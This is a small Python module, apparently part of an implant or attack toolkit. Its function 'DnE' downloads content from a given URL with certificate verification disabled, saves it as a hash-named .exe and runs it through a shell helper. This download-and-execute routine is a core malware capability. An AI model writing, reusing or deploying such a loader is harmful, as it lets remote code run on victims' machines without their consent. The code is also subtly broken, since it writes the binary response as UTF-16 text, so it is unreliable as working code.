import requests, hashlib, os
from libs import shell
def DnE(url, args, noargs):
    #args should be enclosed in brackets (EX: [-f,-h] w/no spaces)
    response = requests.get(url, verify=False)
    filename = hashlib.md5(bytes(response.text, "utf-8"))
    filename = str(filename.hexdigest())
    with open(filename + ".exe", "w", encoding="utf-16") as fHandle:
        fHandle.write(response.text)
    if noargs:
        # execute downloaded binary w/no args
        output = shell.executeSysCmd(filename + ".exe", "", True)
        return output
    else:
        argslist = args[1:len(args)-1].split(",")
        output = shell.executeSysCmd(filename + ".exe", argslist, False)
        return output